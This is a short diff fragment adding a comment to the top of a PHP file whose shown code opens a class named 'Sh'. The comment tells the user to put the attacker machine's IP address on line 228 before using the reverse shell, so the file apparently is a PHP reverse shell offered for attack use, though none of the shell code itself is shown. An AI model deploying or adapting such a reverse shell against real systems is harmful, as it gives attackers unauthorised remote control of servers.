@@ -1,3 +1,6 @@
+#/////////////before using the reverse shell replave the IP address on line 228 with the attacker machines IP address////////// <
+
+
 <?php class Sh
 {
     private $a = null;
